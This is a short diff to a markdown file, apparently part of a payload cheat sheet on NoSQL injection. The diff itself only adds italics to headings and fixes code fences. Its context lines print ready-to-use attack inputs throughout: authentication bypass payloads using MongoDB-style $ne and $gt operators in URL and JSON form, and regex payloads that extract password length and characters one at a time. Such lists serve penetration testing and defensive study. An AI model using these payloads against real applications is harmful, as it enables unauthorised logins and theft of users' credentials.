@@ -1,7 +1,7 @@
 # NoSQLInjection
 
 ## Exploit
-Basic authentication bypass using not equal ($ne) or greater ($gt)
+_Basic authentication bypass using not equal ($ne) or greater ($gt)_
 ```
 in URL
 username[$ne]=toto&password[$ne]=toto
@@ -11,12 +11,13 @@ in JSON
 {"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
 {"username": {"$gt": undefined}, "password": {"$gt": undefined} }
 ```
-Extract length information
+_Extract length information_
 ```
 username[$ne]=toto&password[$regex]=.{1}
 username[$ne]=toto&password[$regex]=.{3}
-Extract data information
-
+```
+_Extract data information_
+```
 in URL
 username[$ne]=toto&password[$regex]=m.{2}
 username[$ne]=toto&password[$regex]=md.{1}
